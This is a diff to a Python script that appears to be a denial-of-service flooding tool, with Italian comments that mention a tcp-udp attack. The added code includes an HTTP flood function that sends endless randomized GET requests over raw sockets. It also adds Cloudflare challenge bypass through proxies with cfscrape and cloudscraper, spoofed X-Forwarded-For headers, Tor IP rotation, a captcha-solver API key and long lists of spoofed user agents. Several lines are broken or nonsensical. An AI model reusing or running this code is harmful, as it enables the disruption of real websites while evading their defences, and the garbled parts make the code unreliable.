@@ -15,8 +15,6 @@ import sys
 from flask import Flask, g
 from flask_limit import RateLimiter
 from bs4 import BeautifulSoup
-from aiohttp import web
-from aiohttp_limit import LimitMiddleware
 from ratelimit import limits, RateLimitException
 from ratelimit import limits, sleep_and_retry
 from backoff import on_exception, expo
@@ -24,9 +22,9 @@ from fake_useragent import UserAgent
 import asyncio
 from requests_guard import guard
 from request_limiter import request_limiter, LimitedIntervalStrategy, LimitException
-from aiocfscrape import CloudflareScraper
 from proxy_requests import ProxyRequests
 from ratelimiter import RateLimiter
+from toripchanger import TorIpChanger
 
 try: # se si è sotto linux scapy (per l'attacco tcp-udp) funziona
 	from scapy.all import * # importa scapy
@@ -55,7 +53,7 @@ FIFTEEN_MINUTES = 900
 @on_exception(expo, RateLimitException, max_tries=800)
 @limits(calls=150, period=FIFTEEN_MINUTES)
 def call_api(url):
-    response = requests.get('freeboot.to'),
+    response = requests.get(url)
 
     if response.status_code != 500:
         raise Exception('API response: {}'.format(response.status_code))
@@ -67,7 +65,7 @@ def call_api(url):
             if i == '1':
                 res = res + 1
         return res
-                                          
+
     def solve_challenge(self, challenge):
         rand_words = re.search(r's,t,o,p,b,r,e,a,k,i,n,g,f, ([^\=]*)\=\{\"([^\"]*)', challenge)
         rnd1, rand2 = rand_words.group(1), rand_words.group(2)
@@ -157,16 +155,15 @@ def call_api(url):
               
 requests.get = ("google.com")
 
+import cloudscraper
 scraper = cloudscraper.create_scraper(debug=True)
-session = requests.session()
-scraper = cloudscraper.create_scraper(sess=session)
 scraper = cloudscraper.create_scraper(delay=1000)
 proxies = {"http": "http://localhost:8080", "https": "http://localhost:8080"}
-proxies = {"http": "http://google.com:8080", "https": "http://google.com:8080"}
+proxies = {"http": "http://google.com:8080","https": "https://google.com:8080"}
 scraper = cloudscraper.create_scraper(
     browser={
         'browser': 'firefox',
-        'mobile': False
+        'mobile': True
     }
 )
 scraper = cloudscraper.create_scraper(
@@ -181,8 +178,97 @@ scraper = cloudscraper.create_scraper(
     'api_key': '1abc234de56fab7c89012d34e56fa7b8'
   }
 )
+scraper = cloudscraper.create_scraper(
+  interpreter='nodejs',
+  recaptcha={
+    'provider': 'anticaptcha',
+    'api_key': 'P6KLRNy7h3K160ZmYNUOAce7'
+  }
+)
 session = requests.session()
 scraper = cloudscraper.create_scraper(sess=session)
+
+
+strings = "asdfghlqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM1234567890"
+def HTTP(ip, port, path):
+	global stop
+	while True:
+		if stop :
+			break
+		try:
+			s=socket.socket()
+			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+			s.settimeout(5)
+			s.connect((str(ip), int(port)))
+			if port == 80:
+				s = ssl.wrap_socket(s)
+			for y in range(100):
+				get_host = "GET "+path+"?"+str(random.randint(0,50000))
+				for _ in range(100):
+					get_host += strings[random.randint(0,len(strings))]
+				get_host += str(random.randint(0,50000))+ " HTTP/1.1\r\nHost: " + ip + "\r\n"
+				connection = "Connection: Keep-Alive\r\n"
+				useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+				accept = random.choice(acceptall)
+				http = get_host + useragent + accept + connection + "\r\n"
+				s.send(str.encode(http))
+			s.close()
+		except:
+			pass
+                                                  
+def is_protected_by_cf():
+    try:
+        first_request = subprocess.check_output(
+            ["curl", "-A", format(random.choice(ua_file)), args.host], timeout=100)
+        first_request = first_request.decode("ascii", errors="ignore")
+        find_keyword = False
+        for line in first_request.splitlines():
+            if line.find("Checking your browser before accessing") != -1:
+                find_keyword = False
+    except Exception:
+        return False
+    return find_keyword
+
+def set_request():
+    global request
+    get_host = "GET " + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
+    useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+    accept = random.choice(acceptall)
+    connection = "Connection: Keep-Alive\r\n"
+    request = get_host + useragent + accept + \
+              connection + "\r\n"
+    request_list.append(request)
+
+def generate_cf_token(i):
+    proxy = proxy_list[i].strip().split(":")
+    proxies = {"http": "http://" + proxy[0] + ":" + proxy[1]}
+    try:
+        cookie_value, user_agent = cfscrape.get_cookie_string(url, proxies=proxies)
+        tokens_string = "Cookie: " + cookie_value + "\r\n"
+        user_agent_string = "User-Agent: " + user_agent + "\r\n"
+        cf_token.append(proxy[0] + "#" + proxy[1] + "#" + tokens_string + user_agent_string)
+    except:
+        pass
+def set_request_cf():
+    global request_cf
+    global proxy_ip
+    global proxy_port
+    cf_combine = random.choice(cf_token).strip().split("#")
+    proxy_ip = cf_combine[0]
+    proxy_port = cf_combine[1]
+    get_host = "GET " + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
+    tokens_and_ua = cf_combine[2]
+    '''
+    print("ip: "+cf_combine[0]+"\n")
+    print("port: "+cf_combine[1]+"\n")
+    print("Cookie&UA: "+cf_combine[2]+"\n")
+    '''
+    accept = random.choice(acceptall)
+    randomip = str(random.randint(1, 255)) + "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))
+    forward = "X-Forwarded-For: " + randomip + "\r\n"
+    connection = "Connection: Keep-Alive\r\n"
+    request_cf = get_host + tokens_and_ua + accept + forward + connection + "\r\n"
+                                                     
 def limited(until):
     duration = int(round(until - time.time()))
     print('Rate limited, sleeping for {:d} seconds'.format(duration))
@@ -192,7 +278,23 @@ rate_limiter = RateLimiter(max_calls=200, period=3, callback=limited)
 for i in range(3):
     with rate_limiter:
         print('Iteration', i)
-                                                                                                                                                                                   
+
+
+from typing import Any, TYPE_CHECKING
+try:
+    from typing import Coroutine
+except ImportError:
+    class _Coroutine:
+        # Fake, so you can do Coroutine[foo, bar, baz]
+        # You could assert the proper number of items are in the slice,
+        # but that seems like overkill, given that mypy will check this
+        # and at runtime you probably no longer care
+        def __getitem__(self, index: Any) -> None:
+            pass
+
+    if not TYPE_CHECKING:
+        Coroutine = _Coroutine()
+                                                                                                                                                                                         
 global data                          
 headers = open("headers.txt", "r")
 data = headers.read()
@@ -310,12 +412,20 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 "Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +http://www.cloudflare.com/always-online) AppleWebKit/534.34",
     "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)",
                         "Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; Build/LMY47D ) AppleWebKit/534.30 (KHTML,like Gecko) Version/4.0 Chrome/50.0.0.0 Mobile Safari/534.30 GIONEE-GN9010/GN9010 RV/5.0.16",
+                       "Mozilla/5.0 (compatible; Google-Site-Verification/1.0)",
+                       "Dalvik/1.6.0 (Linux; U; Android 4.4.2; GT-I9190 Build/KOT49H)",
+                       "Mozilla/5.0 (Linux; Android 4.4.2; DEXP Ixion ES2 4.5 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 YaBrowser/14.5.1847.18432.00 Mobile Safari/537.36",
                         "Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; Build/MRA58K ) AppleWebKit/534.30 (KHTML,like Gecko) Version/4.0 Chrome/50.0.0.0 Mobile Safari/534.30 GIONEE-S9/S9 RV/5.0.17",
+                        "VK/28 CFNetwork/711.4.6 Darwin/14.0.0",
+                        "Instagram 8.2.0 (iPhone4,1; iPhone OS 8_4; ru_RU; ru; scale=2.00; 640x960)    AppleWebKit/420+",
                         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36",
                        "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
+                       "Mozilla/5.0 (compatible; vkShare; +vk.com/dev/Share)",
                        "Mozilla/5.0 (Windows Mobile 10; Android 8.0.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36 Edge/80.0.361.62"  
                         "Mozilla/5.0 (Linux; Android 5.1.1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/2.3 Chrome/59.0.3071.125 Mobile Safari/537.36"
                         "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N)"
+                        "Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.84 Safari/537.36 CrKey/1.21a.76178",
+                        "Sogou head spider/3.0( http://www.sogou.com/docs/help/webmasters.htm#07)",
                         "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0"
                         "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
                         "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.99 Safari/537.36 Vivaldi/2.9.1705.41",
@@ -940,6 +1050,7 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 			"wii libnup/1.0",
 			]
 
+
 def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
 	global url
 	global url2
@@ -953,11 +1064,11 @@ def starturl(): # in questa funzione setto l'url per renderlo usabile per il fut
 
 	try:
 		if url[0]+url[1]+url[2]+url[3] == "www.":
-			url = "http://" + url
-		elif url[0]+url[1]+url[2]+url[3] == "http":
+			url = "https://" + url
+		elif url[0]+url[1]+url[2]+url[3] == "https":
 			pass
 		else:
-			url = "http://" + url
+			url = "https://" + url
 	except:                                                                                              
 		print("You mistyped, try again.")
 		starturl()
